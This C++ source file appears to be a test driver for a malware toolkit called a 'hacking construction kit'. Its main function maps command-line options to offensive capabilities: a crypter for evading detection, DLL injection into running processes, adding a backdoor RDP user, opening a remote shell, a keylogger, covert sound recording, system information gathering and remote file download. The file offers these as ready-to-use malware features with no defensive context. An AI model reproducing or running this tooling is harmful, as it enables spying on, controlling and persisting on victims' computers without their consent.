/*
 * Author: thirdstormofcythraul@outlook.com
 */
#ifdef _DEBUG
#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>
#endif

#pragma warning(disable: 4996)

#include <stdio.h>
#include <cstdio>
#include <string>
#include <fstream>
#include <stdlib.h>
#include <iostream>

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Winuser.h>
#include <tchar.h>

#include <keylogger.h>
#include <cprocess.h>
#include <macro.h>
#include <base64.h>
#include <ccrypter.h>
#include <check.h>
#include <cshell.h>
#include <file.h>
#include <http_helper.h>
#include <icmp.h>
#include <info.h>
#include <extern\RSA.h>
#include <sound_recorder.h>
#pragma comment(lib, "hacking construction kit.lib")
#pragma comment(lib, "zlibstat.lib")

#include <memory_debug.h>

using namespace std;

int main(int argc, _TCHAR* argv[])
{
	if (argc == 1){
		printf("Test hck library\n");
		printf("Encode base 64: a value\n");
		printf("Decode base 64: b value\n");
		printf("Crypter: c infile outfile\n");
		printf("Find open TCP port: d port\n");
		printf("Kill a process: e pid\n");
		printf("Inject dll: f path pid\n");
		printf("Inject dll with LoadLibrary: g path pid\n");
		printf("Add a RDP user: h username password\n");
		printf("Remove RDP user: i username\n");
		printf("Open a remote shell: j port\n");
		printf("Find files: k path filename\n");
		printf("Replace in a file: l infile outfile searched size replaced\n");
		printf("Send GET: m url\n");
		printf("Send POST: n server uri post\n");
		printf("Download: o uri filename\n");
		printf("Ping: p address\n");
		printf("Get all infos: q\n");
		printf("Start key logger: r filename\n");
		printf("Generate RSA keys: s digits\n");
		printf("Sound record: t filename time\n");

		return 0;
	}
	_TCHAR firstParam = *argv[1];
	if (firstParam == 'a'){
		unsigned char *value = (unsigned char*)argv[2];
		// Encode b64
		Base64 b64;
		size_t output;
		char * encoded = b64.encode(value, strlen((char *)value), &output);

		char *buffer = new char[output + 1];
		buffer[output] = '\0';
		_snprintf(buffer, output, "%s", encoded);

		printf(buffer);

	} else if (firstParam == 'b'){
		// Decode b64
		char *value = argv[2];
		// Encode b64
		Base64 b64;
		size_t output;
		unsigned char * encoded = b64.decode(value, strlen((char *)value), &output);

		char *buffer = new char[output + 1];
		buffer[output] = '\0';
		_snprintf(buffer, output, "%s", encoded);

		printf(buffer);
	} else if (firstParam == 'c'){
		// Crypter
		char *infile = argv[2];
		char *outfile = argv[3];
		Crypter::evadeSandbox = false;
		Crypter::crypt(infile, outfile);
	} else if (firstParam == 'd'){
		// Find open port
		char *port = argv[2];
		char ip[20];
		if (Check::findHostPortOpen(ip, atoi(port))){
			printf("Found a port open on %s\n", ip);
		}
	} else if (firstParam == 'e'){
		// Kill process
		char *pid = argv[2];
		if (Process::killProcess(atoi(pid))){
			printf("Process killed\n");
		}
	} else if (firstParam == 'f'){
		// Inject dll
		char *path = argv[2];
		char *pid = argv[3];
		if (Process::injectDll(path, atoi(pid))){
			printf("Injection ok\n");
		}
	} else if (firstParam == 'g'){
		// Inject dll with LoadLibrary
		char *path = argv[2];
		char *pid = argv[3];
		if (Process::injectDllWithLoadLibrary(path, atoi(pid))){
			printf("Injection ok\n");
		}
	} else if (firstParam == 'h'){
		// Add rdp user
		char *username = argv[2];
		char *password = argv[3];
		Shell::addRdpUser(username, password);
	} else if (firstParam == 'i'){
		// Remove rdp user
		char *username = argv[2];
		Shell::removeRdpUser(username);
	} else if (firstParam == 'j'){
		// Open shell
		char *port = argv[2];
		Shell::openShell(atoi(port));
		Sleep(INFINITE);
	} else if (firstParam == 'k'){
		// Find files
		char *path = argv[2];
		char *filename = argv[3];
		vector<string> files;
		DWORD totalSize = 0;

		if (File::findFile(files, path, filename, totalSize)){
			for (vector<string>::iterator it = files.begin() ; it != files.end(); ++it){
				std::cout << *it << std::endl;
			}
		}
	} else if (firstParam == 'l'){
		// Replace in a file
		char *infile = argv[2];
		char *outfile = argv[3];
		char *searched = argv[4];
		char *size = argv[5];
		char *replace = argv[6];
		if (File::replaceInFile(infile, outfile, searched, atoi(size), replace)){
			printf("String replaced\n");
		}

	} else if (firstParam == 'm'){
		// Send GET
		char *uri = argv[2];
		HttpHelper helper;
		LPSTR *response = helper.get(uri);
		while(*response != 0){
			printf("%s", *response);
			response++;
		}
	} else if (firstParam == 'n'){
		// Send POST
		char *server = argv[2];
		char *uri = argv[3];
		char *post = argv[4];
		char *response;
		int size;
		HttpHelper helper;
		if (helper.sendPost(server, uri, post, &response, size)){
			Print::printBuffer(response, size);
		}

	} else if (firstParam == 'o'){
		// Download
		char *uri = argv[2];
		char *filename = argv[3];
		HttpHelper helper;
		helper.download(uri, filename);
	} else if (firstParam == 'p'){
		// Ping
		char *ip = argv[2];
		if (Icmp::ping(ip)){
			printf("Ping %s ok\n", ip);
		}
	} else if (firstParam == 'q'){
		// Get all infos
		std::cout << Info::getAllInfos();
	} else if (firstParam == 'r'){
		// Start key logger
		char *filename = argv[2];
		Keylogger::startKeylogger(filename);
		Sleep(INFINITE);
	} else if (firstParam == 's'){
		// Generate RSA key pairs
		char *digits = argv[2];
		KeyPair pair = RSA::GenerateKeyPair(atoi(digits));
		std::cout << pair << std::endl;
	} else if (firstParam == 't'){
		SoundRecorder sound;
		char *filename = argv[2];
		char *time = argv[3];
		if (sound.record(atoi(time), filename)){
			printf("Sound recorded ok\n");
		}
	} else {
		printf("Params not recognised\n");
	}

}